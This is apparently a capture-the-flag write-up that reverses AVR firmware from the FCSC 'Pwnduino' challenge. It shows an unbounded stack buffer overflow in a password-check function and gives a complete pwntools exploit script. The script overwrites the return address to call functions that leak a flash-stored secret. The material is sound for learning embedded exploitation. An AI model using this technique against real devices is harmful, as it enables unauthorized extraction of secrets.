+++
title = "PWN: AVR exploitation"
date = "2024-10-30T15:44:39+01:00"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["write-up", "pwn", "avr"]
keywords = ["write-up", "pwn", "avr"]
description = "A basic embedded system exploitation challenge"
showFullContent = false
readingTime = false
hideComments = false
toc = true
+++

# PWN: Hackropole - Pwnduino

[This challenge](https://hackropole.fr/fr/challenges/pwn/fcsc2023-pwn-pwnduino/) is about reversing and exploiting an `AVR` board (it's a CPU architecture by _Atmel_ used in embedded devices).

## Challenge Description

An industrial system uses an AVR board to store secrets and performs crypto primitives (calculate a custom `CRC`). We have access to the `debug` firmware and the source code. The AVR board service is accessible at `localhost:4000`.

Let's first analyze the exposed service. We connect to it with `socat` and are prompted to enter a password until it got succesfully validated. It doesn't seem we can access other features until we enter correct password.

```bash
$ socat tcp:localhost:4000 -
yo
KO :-( Bad password ...
Please enter your passphrase to compute CRC:
pass 
KO :-( Bad password ...
Please enter your passphrase to compute CRC:
```

## Source code analysis

**Project Structure:**

We have two C files `main.c` and `uart.c` with their associated headers, which should holds the firmware logic. The header file `secrets_debug.h` (or `secrets_prod.h` for production) contains the secrets we want to leak (password and flag).

By looking at the `Makefile.debug` file, we can retrieve the AVR board running the firmware which is an `ATmega2560` and is compiled with `avr-gcc`.
The `EEPROM` section is removed from the firmware during compilation process.

We will now explore the source code to understand logic and unveil potential vulns. The `main.c` file appears to be of first interest, we briefly look at `uart.c` to confirm it's a simple `UART` interface. We will assume it's not vulnerable for now, and eventually look at it if needed.

> The UART interface could, indeed, be interesting because implementing low level protocols need to be done in a careful way to avoid memory corruptions. But for this challenge, it's seems not to be the primary target and just here for communication logic.

**main.c:**

The main function remains simple. It initializes the UART interface, remove existing data in UART streams and run the main loop. 

The later asks for the password and check if it's correct (`password_check` function, we will look at it later). If not, it displays an error message and jump to loop start. Otherwise, it computes the CRC (an `uint8_t`) using the secret stored in `FLASH` memory (retrieved using `pgm_read_byte` AVR primitive) and write it to the EEPROM.

```c
#include <avr/io.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <avr/pgmspace.h>
#include <avr/eeprom.h>

#include "main.h"
#include "uart.h"

#if defined(PRODUCTION)
#include "secrets_prod.h"
#else
#include "secrets_debug.h"
#endif
#define SECRET_SIZE (sizeof(secret) - 1)

const char *get_secret_address(void)
{
	return secret;
}

unsigned char compute_secret_crc(void)
{
	unsigned char crc = 0, i;

	const char *s = get_secret_address();

	for(i = 0; i < SECRET_SIZE; i++){
		crc ^= pgm_read_byte(&(s[i]));
	}

	return crc;
}

int passwd_check(void){
    	char buff[sizeof(passwd)];
	unsigned int i;
	int check;

	memset(buff, 0, sizeof(buff));
	i = 0;
	while(1){
		buff[i] = uart_get();
		if(buff[i] == '\n'){
			buff[i] = 0;
			break;
		}
		i++;
	}
	check = 0;
	for(i = 0; i < sizeof(passwd); i++){
		check |= (buff[i] ^ pgm_read_byte(&(passwd[i])));
	}
	return check;
}

int main(void) {    
    uart_init();
    uart_flush();
    
    uart_puts("=== Welcome!\r\n");
    while(1) {
		uart_puts("Please enter your passphrase to compute CRC:\r\n");
		if(passwd_check() == 0){
			unsigned char crc;
			uart_puts("OK! Computing the secret CRC\r\n");
			crc = compute_secret_crc();
			uart_puts("Writing CRC to EEPROM ...\r\n");
			eeprom_write_byte(0, crc);
		}
		else{
			uart_puts("KO :-( Bad password ...\r\n");
		}
    }
    return 0;
}
```

From here, we can say that the primary target for exploiting the challenge is the `passwd_check` function, because it's the only way to interact with the program if we don't have the password yet.  

**passwd_check:**

The function is using UART primitives to read the user input into a local stack buffer (`buff`) with fixed size (`sizeof(passwd)`, 17 bytes). It then xor the input with the password stored in FLASH memory, add the result to an accumulator (`check`) and return the final result (which should be `0` on success).

The problem here is that the user input retrieving code is not bounded on the size of `buff` and only stop when reaching an `'\n'` character. This means we can overflow the buffer and write arbitrary data onto the stack, which could lead to code execution.

```c
char buff[sizeof(passwd)];      // allocate to a certain size
unsigned int i;
int check;

memset(buff, 0, sizeof(buff));
i = 0;
while(1){
    buff[i] = uart_get();
    if(buff[i] == '\n'){
        buff[i] = 0;
        break;              // only breaks on '\n'
    }
    i++;                // i can go bigger than sizeof(buff)
}
...
```

## Exploitation

### Plan

Now that we are aware of a buffer overflow vulnerability, we need to think of a way to exploit it.

Let's break down what we know:
- `passwd_check` function is vulnerable to buffer overflow when retrieving user input
    - the checking of the password cannot be tempered as the overwritten variable `check` is set after the overflow happens (overwritting our changes)
- the `secret` content is stored in `FLASH`
- the only interface between attacker and the board is `UART`

Our final goal is to leak the stored secret. We would like to exploit the `passwd_check` function, make the program read the secret and display it on the UART interface. 

This requires to create a ROPchain that will retrieve the secret memory location with `get_secret_address`, and then use `pgm_read_byte` and `uart_putc` to display each byte of the secret. The involved ROPchain will not be so simple as we need to loop over each characters of the secret (incrementing the address and stopping when current char is `'\0'`)

Luckily enough, the `uart.c` interface has a `uart_puts_p` function which already achieve this goal:

```c
void uart_puts_p(const char *str) {
    while(pgm_read_byte(str) != 0x00) { 
        uart_putc(pgm_read_byte(str++));
    }
}
```

This really simplify the exploit as we only need to retrieve the secret address and call this function.

Now that we have our plan ready to exploit the firmware, we need to look at the compiled code with **IDA** or **ghidra** in order to craft the exploit script. 

> I first choose to use ghidra because it has decompilers for AVR ATmega2560. I used it to better map correspondance between source and executable functions, but I finally ended up switching back to IDA and just reading assembly code, because decompiled code was not so clear.

### AVR Internals

As I didn't know very much yet about AVR architectures, I used [this ressource](https://hackaday.io/course/176685-avr-architecture-assembly-reverse-engineering) to learn AVR, and looked at the [instruction set manual](https://ww1.microchip.com/downloads/en/DeviceDoc/AVR-Instruction-Set-Manual-DS40002198A.pdf) and [ATmega2560 datasheet](https://ww1.microchip.com/downloads/aemDocuments/documents/OTH/ProductDocuments/DataSheets/ATmega640-1280-1281-2560-2561-Datasheet-DS40002211A.pdf) when needed. There is also interesting material in [avr-gcc documentation](https://gcc.gnu.org/wiki/avr-gcc#Calling_Convention) about calling convention.

What's important to care about in AVR architecture:
- Harvard architecture (CODE and DATA segments are separated, respectively in FLASH and RAM)
- CPU registers are located in first bytes of the RAM
- instructions are fixed size (16 or 32 bits)
- `SP` and `FP` are **not aligned** (1-byte alignement)
    - a `PUSH` instruction pushes 1 byte
- **return address is 2 or 3 bytes wide**
    - could be empty for tail-called functions (leaf functions)
- **memory locations and addresses are not always the same**
    - the address used in `CALL`, or `JMP`, is: `mem_ea / 2` (which corresponds to the instruction offset)
    - if you look at 2 consecutive 16-bits instructions in IDA or ghidra, you will see the address is only incremented by 1 (but actual memory location of the second instruction is 2 bytes far from first one)
    ![consecutive instructions](/img/pwn-hackropole_pwnduino/consecutive-insns.png)
    - **radare2** is displaying memory location instead of instruction offsets (but the instruction offsets are still used by call/jmp instructions)

### Firmware Analysis


#### Reconstructing the firmware

Let's say we don't have access to the source code, but only to the firmware binary. We could just load the binary into IDA and start reversing, but only the ROM would be recognized and loaded.

In order to fix this, we can spot the `__do_copy_data` code (which copies data from FLASH to RAM at startup) and reconstruct the RAM, before loading it in IDA.

Let's open the `firmware_debug.bin` file in IDA. Select AVR architecture and you will be prompt to select an AVR configuration file which defines memory layout, registers addresses, etc... The `ATmega640` shares same layout as our `ATmega2560` board except it has a smaller FLASH memory (64KB instead of 256KB). I modified the IDA AVR config file (`<idapro-dir>/cfg/avr.cfg`) to duplicate the entry and modify RAM size, you can find the modified file [here](/ida-avr.cfg)

The first instruction at `0x0` should be a jump to address `0x86` (the `__RESET` handler). In this routine, we can find `__do_copy_data` at address `0x8e` (not labeled by default, click the current instruction and press `N` for renaming). Just after the loop, the reset handler call the `main`.

The `__do_copy_data` code retrieves the RAM start address (specified in [board datasheet](https://ww1.microchip.com/downloads/aemDocuments/documents/OTH/ProductDocuments/DataSheets/ATmega640-1280-1281-2560-2561-Datasheet-DS40002211A.pdf)) and FLASH address of data to copy. You can notice RAM address is copied into `X` register when FLASH address is written to `Z` register. Then it uses these pointers to set RAM memory with the `ELPM` instruction until it reaches the end of RAM data in FLASH.

> The `LPM` and `ELPM` instructions are used to access FLASH memory data.

![RESET handler code](/img/pwn-hackropole_pwnduino/reset_handler.png)

We can see that:
- RAM start address is `0x200`
- RAM data is located at `0x4BA` in FLASH (meaning we need to skip 1210 bytes in firmware file)
- RAM data in FLASH is 148 bytes long (`0x94`)

Thus, we can use following commands to reconstruct the RAM:
```bash
dd if=firmware_debug.bin of=/tmp/RAM.bin skip=1210 count=148 bs=1
dd if=/dev/zero of=/tmp/RAM.bin seek=148 count=8043 bs=1
```

Then verify RAM was correctly created:
```bash
$ xxd /tmp/RAM.bin | head -n10
00000000: 3d3d 3d20 5765 6c63 6f6d 6521 0d0a 0050  === Welcome!...P
00000010: 6c65 6173 6520 656e 7465 7220 796f 7572  lease enter your
00000020: 2070 6173 7370 6872 6173 6520 746f 2063   passphrase to c
00000030: 6f6d 7075 7465 2043 5243 3a0d 0a00 4f4b  ompute CRC:...OK
00000040: 2120 436f 6d70 7574 696e 6720 7468 6520  ! Computing the 
00000050: 7365 6372 6574 2043 5243 0d0a 0057 7269  secret CRC...Wri
00000060: 7469 6e67 2043 5243 2074 6f20 4545 5052  ting CRC to EEPR
00000070: 4f4d 202e 2e2e 0d0a 004b 4f20 3a2d 2820  OM ......KO :-( 
00000080: 4261 6420 7061 7373 776f 7264 202e 2e2e  Bad password ...
00000090: 0d0a 0000 0000 0000 0000 0000 0000 0000  ................
```

We can finally load the RAM file (`File->Load file->Additional binary file`). Choose the right options when adding the segment:
![additional binary file prompt](/img/pwn-hackropole_pwnduino/create-RAM.png)

Then modify the created segment in `View->Open subviews->Segments` and add the extra space for registers before RAM content (also change segment class and optionally the segment name).
![extend RAM with regs](/img/pwn-hackropole_pwnduino/modif-RAM.png)

Good job ! Now we are able to look at the resolved address in RAM. Let's confirm it. Go to the `main` function and locate the first call to `uart_puts` (address `0x226`). You can see setup the arguments in `r24:r25` which holds the RAM address of the string to display (`0x0200`). Jump to this location by pressing `G` and entering `RAM:0x200`, you should see the string `"=== Welcome!"` (eventually press `A` on the address to convert data to string)




#### Reversing

You can find [here](/firmware_debug.bin.i64.tgz) the IDA database of the firmware, I have already identified and renamed all the functions, but you can also compile the `elf` firmware binary from the `public` dir, and load this one into IDA (it will already have all functions renamed and memory layout correctly mapped)

We now want to know exactly how many bytes the `passwd_check` function allocates and what is the stack layout. If we look at the function prologue, we see it pushes previous FP and allocates 24 bytes, and then it calls `memset(buff, 0, sizeof(buff))`. We can see here that the `buff` variable is located at `Y+8`, but we can see in avr-gcc documentation that stack top (they use bottom term instead) is located at `Y+1`. Thus the buffer is located at `SP+7`, and is 19 bytes from the return address ((24+2)-7).

![passwd_check function prologue](/img/pwn-hackropole_pwnduino/passwd_check-prologue.png)

Now we need to know how many bytes is the return address. As I didn't achieve to find this information on internet, I ended up determining this using dynamic analysis. We will setup a debugging environment with qemu.

Install `avr-gcc`, `avr-libc`, `avr-gdb` and `qemu-system-avr`, then compile the firmware elf and run:
```bash
qemu-system-avr -M mega2560 -bios firmware_debug.elf -nographic -serial tcp::1337,server=on,wait=off -s -S
```

I found the command on the internet. From what I understood with documentation, it emulates the firmware, redirect serial I/O to tcp port `1337`, starts gdb server on port `1234` (`-s`) and halt the CPU on startup (`-S`).

We can now debug the firmware with:
```bash
$ avr-gdb -q ./firmware_debug.elf 
(gdb) target remote :1234
Remote debugging using :1234
warning: Target-supplied registers are not supported by the current architecture
0x00000000 in __vectors ()
(gdb) 
```

Add a breakpoint on `passwd_check` stack cleanup epilogue (disas the function in gdb and locate the `cli` instruction at the end), then continue execution:
```bash
(gdb) b *0x00000428
Breakpoint 1 at 0x800428
(gdb) c
```

Let's check the stack to see the return address.

```bash
^C
Program received signal SIGINT, Interrupt.
0x000001fa in uart_get () at uart.c:27
27		while (!(UCSR0A & (1<<RXC0))) {} 
(gdb) bt
#0  0x000001fa in uart_get () at uart.c:27
#1  0x00000376 in passwd_check () at main.c:45
#2  0x0000045c in main () at main.c:66
(gdb) frame 1
#1  0x00000376 in passwd_check () at main.c:45
45			buff[i] = uart_get();
(gdb) x/30xh $sp
0x8021dc:	0x00bb	0x0000	0x0000	0x0000	0x0000	0x0000	0x0000	0x0000
0x8021ec:	0x0000	0x0000	0x0000	0x0000	0x2100	0x00f9	0x2e02	0x2100
0x8021fc:	0x00ff	0x9d00	Cannot access memory at address 0x802200
```

Remember called address is not the same as memory address. Thus, divide the frame return address by 2 (`hex(0x45c // 2) == 0x22e`. We can see that FP, which is located just above return address, would be `0xf900` if return address was 2 bytes, which is an invalid stack frame pointer. It makes much more sense to think return address is 3 bytes, as FP would be `0x21f9` in this case (remember that stack base is `0x21ff`).


Now, continue the process in gdb and write some data to UART (not too much, stack frame is close to the stack base), then check the stack layout after the `cli` instruction.

In shell:
```bash
socat exec:"python3 -c \"print('A'*19 + 'BBCC')\"" tcp:localhost:1337
```

Check back the stack to see `"BBC"` (`0x424243`) get written to the return address.

```bash
Program received signal SIGTRAP, Trace/breakpoint trap.
0x00000428 in passwd_check () at main.c:57
57	}
(gdb) x/30xh $sp
0x8021dc:	0x11bb	0x5900	0x0b00	0x0001	0x4141	0x4141	0x4141	0x4141
0x8021ec:	0x4141	0x4141	0x4141	0x4141	0x4141	0x4241	0x4342	0x0043
0x8021fc:	0x00ff	0x9d00	Cannot access memory at address 0x802200
(gdb) 
```

Now that we know how many bytes to overflow and how many bytes is the return address. Let's build the exploit.

```python
#!/usr/bin/env python3

from pwn import *
import argparse

context.arch = 'avr'
context.bits =  8
context.endian = 'big'

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('host', type=str, help='Target host')
    parser.add_argument('port', type=int, help='Target port')
    args = parser.parse_args()

    host = args.host
    port = args.port

    get_secret_address_ea = 0x169
    uart_puts_p_ea = 0x135 
    reset_handler_ea = 0x0 

    r = remote(host, port)

    payload = b'A' * 19
    payload += b'\x00' + p16(get_secret_address_ea)
    payload += b'\x00' + p16(uart_puts_p_ea)
    # uncomment following line to correctly terminate exploit
    # it is not prepended with b'\x00' because the '\n' sent
    # by `sendline` will be overwritten by the program with a 
    # null byte, we cannot inject it ourself because it would
    # write the '\n' out of stack memory limit
    #payload += p16(reset_handler_ea)   
                                        
                                        

    r.sendline(payload)
    sleep(0.5)
    ans = r.recv(4096, timeout=1)
    r.close()
    try:
        print('flag:', ans.decode('utf-8'))
    except:
        print('flag:', ans)
```

Running it give us the flag:
```bash
$ python3 exploit.py localhost 4000
[+] Opening connection to localhost on port 4000: Done
[*] Closed connection to localhost port 4000
flag: FCSC{__REDACTED__}
```
